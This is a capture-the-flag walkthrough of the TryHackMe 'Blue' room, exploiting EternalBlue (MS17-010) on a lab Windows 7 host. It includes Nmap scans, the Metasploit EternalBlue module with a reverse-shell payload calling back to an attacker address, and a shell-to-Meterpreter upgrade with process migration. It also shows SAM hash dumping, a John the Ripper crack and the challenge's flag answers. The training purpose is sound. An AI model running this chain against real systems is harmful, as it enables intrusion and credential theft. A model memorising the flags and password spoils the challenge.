---
icon: windows
cover: https://assets.tryhackme.com/additional/banners/GosxHyQ.jpg
coverY: 0
coverHeight: 139
---

# Blue

**Date:** 27.03.2026&#x20;

**Room Category:** Challenge

**Target IP:** 10.48.162.54&#x20;

**Core Concept:** Deploying and hacking into a Windows machine by leveraging the famous MS17-010 (EternalBlue) vulnerability, performing shell upgrades, and escalating privileges to NT AUTHORITY\SYSTEM.

In this walkthrough, we exploit the notorious MS17-010 (EternalBlue) vulnerability on a Windows 7 system. We will perform Nmap reconnaissance, execute the exploit via Metasploit, upgrade to a Meterpreter session for stability, and conclude by dumping and cracking user password hashes.

While this lab uses a controlled environment, recent Shodan data shows over 200,000 Windows 7 devices are still active and exposed globally. This highlights the persistent danger of the EternalBlue exploit nearly a decade after its discovery.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

***

## Task 1: Recon

I'm starting the engagement with a standard discovery phase. Since the target isn't responding to ICMP pings, I need to scan it directly to see what services are "talking." I'm looking for high-risk ports like 445 (SMB) or 3389 (RDP) which are common entry points on older Windows systems.

Question: Scan the machine.

> **Answer:** No answer needed

Question: How many ports are open with a port number under 1000?&#x20;

I'll narrow my focus to the standard port range first to get a quick snapshot of the attack surface.

```bash
root@attackbox:~# nmap -p 1-1000 10.48.162.54
Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) 
Nmap scan report for 10.48.162.54
Host is up (0.00067s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
```

> **Answer:** 3

Question: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

Seeing Port 445 open on Windows 7 is a massive red flag. My gut feeling is that this might be vulnerable to EternalBlue, so I'll use Nmap's vulnerability scripting engine (NSE) to confirm my theory before moving to exploitation.

```bash
root@attackbox:~# nmap -p 445 --script=smb-vuln-ms17-010 10.48.162.54
Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) )
Nmap scan report for 10.48.162.54
Host is up (0.00017s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

> **Answer:** ms17-010

***

## Task 2: Gain Access

Now that I've confirmed the MS17-010 vulnerability, I'll switch over to Metasploit. It's the most reliable way to handle the complex memory corruption required for EternalBlue. My goal here is simply to get a foot in the door.

Question: Start Metasploit&#x20;

I'm launching `msfconsole` to start searching for the specific exploit module.

> **Answer:** No answer needed

Question: Find the exploitation code we will run against the machine. What is the full path of the code?&#x20;

I'll use the search function to locate the EternalBlue exploit. I'm looking for the one with an "Average" or "Great" rank for better stability.

```bash
msf6 > search ms17_010
Matching Modules
================
   #  Name                                      Disclosure Date  Rank     Description
   -  ----                                      ---------------  ----     -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Code Execution
```

> **Answer:** exploit/windows/smb/ms17\_010\_eternalblue

Question: Show options and set the one required value. What is the name of this value?

I need to tell Metasploit exactly where the target is. I'll check the options to see which variables are mandatory.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

> **Answer:** RHOSTS

Question: set payload windows/x64/shell/reverse\_tcp. With that done, run the exploit!

I'm opting for a standard reverse shell first to keep things simple. Once the exploit fires, I'm hoping to see a command prompt return to my attacking machine.

```bash
msf6 exploit(...) > set RHOSTS 10.48.162.54
msf6 exploit(...) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(...) > run

[*] Started reverse TCP handler on 10.10.10.10:4444 
[*] 10.48.162.54:445 - Sending all but last fragment of exploit packet
[*] Command shell session 1 opened
C:\Windows\system32>
```

> **Answer:** No answer needed

Question: Confirm that the exploit has run correctly. Background this shell (CTRL + Z).&#x20;

I have local command execution, but this basic DOS shell is too limited for advanced tasks like password dumping. I'll background it for now so I can prepare an upgrade.

> **Answer:** No answer needed

***

## Task 3: Escalate

A basic shell is unstable and lacks features. I need to "upgrade" this session to Meterpreter. Meterpreter runs entirely in memory and gives me a much more powerful toolkit for interacting with the Windows API.

Question: What is the name of the post module we will use to convert the shell?&#x20;

I'll search for a management module that can handle the shell-to-meterpreter transition automatically.

> **Answer:** post/multi/manage/shell\_to\_meterpreter

Question: Select this (use MODULE\_PATH). Show options, what option are we required to change?

I have to point this upgrade module at my existing backgrounded session.

```bash
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options
```

> **Answer:** SESSION

Question: Set the required option, you may need to list all of the sessions to find your target here.

Linking the upgrade module to Session 1 and running it should spawn a brand new Meterpreter session.

```bash
msf6 post(...) > set SESSION 1
msf6 post(...) > run
[*] Upgrading session ID: 1
[*] Meterpreter session 2 opened
```

> **Answer:** No answer needed

Question: Once the meterpreter shell conversion completes, select that session for use.&#x20;

I'm jumping into the new session now. This is where the real post-exploitation begins.

```bash
msf6 > sessions -i 2
```

> **Answer:** No answer needed

Question: Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this.&#x20;

Since MS17-010 exploits a kernel-level driver (srv.sys), I should already have the highest possible privileges. I'll verify my identity to be sure.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> **Answer:** No answer needed

Question: Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id. Question: Migrate to this process using the 'migrate PROCESS\_ID' command.&#x20;

Right now, my shell is running inside the process that was exploited, which is often unstable. I'm going to find a more permanent system process like `smss.exe` and "jump" into it. This ensures that even if the original vulnerable service crashes, my connection stays alive.

```bash
meterpreter > ps
...
 416   4     smss.exe      x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\smss.exe
...
meterpreter > migrate 416
[*] Migrating from 1348 to 416...
[*] Migration completed successfully.
```

> **Answer:** No answer needed

***

## Task 4: Cracking

Now that I have a stable, high-privilege foothold, I can perform "loot" operations. The most valuable data on a local Windows machine is the SAM database, which holds the password hashes for all local users.

Question: Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user?&#x20;

Meterpreter makes this easy with a built-in command to dump the hashes directly from memory.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de3584caac59c7402eaeb9ce5:::
```

> **Answer:** Jon

Question: Copy this password hash to a file and research how to crack it. What is the cracked password?&#x20;

I have Jon's NTLM hash, but I need the cleartext password to understand the user's password policy. I'll save the hash to a local file and use John the Ripper with the `rockyou` wordlist to crack it.

```bash
root@attackbox:~# echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de3584caac59c7402eaeb9ce5:::" > hash.txt
root@attackbox:~# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
alqfna22         (Jon)
```

> **Answer:** alqfna22

***

## Task 5: Find Flags!

To wrap up the engagement, I'll hunt for the proof-of-work flags. I'll use my Meterpreter shell to navigate the filesystem. I'm checking the usual spots: the root of the drive, system configuration folders, and user document directories.

Question: Flag1? This flag can be found at the system root.

```bash
meterpreter > cd C:\\
meterpreter > cat flag1.txt
```

> **Answer:** flag{access\_the\_machine}

Question: Flag2? This flag can be found at the location where passwords are stored within Windows.&#x20;

I'm heading into the `System32\config` folder, the same place the SAM database lives.

```bash
meterpreter > cd C:\\Windows\\System32\\config
meterpreter > cat flag2.txt
```

> **Answer:** flag{sam\_database\_elevated\_access}

Question: flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.&#x20;

User documents are a goldmine for sensitive information. I'll check Jon's personal folder.

```bash
meterpreter > cd C:\\Users\\Jon\\Documents
meterpreter > cat flag3.txt
```

> **Answer:** flag{admin\_documents\_can\_be\_valuable}

***

## Conclusion

This engagement perfectly illustrates why patching is critical. By leaving the SMBv1 service enabled on an unpatched Windows 7 machine, the organization allowed me to go from "zero access" to "Full Domain Admin-level control" in under 10 minutes. Through reconnaissance, targeted exploitation, and privilege escalation via process migration, I was able to fully compromise the target's identity and data.
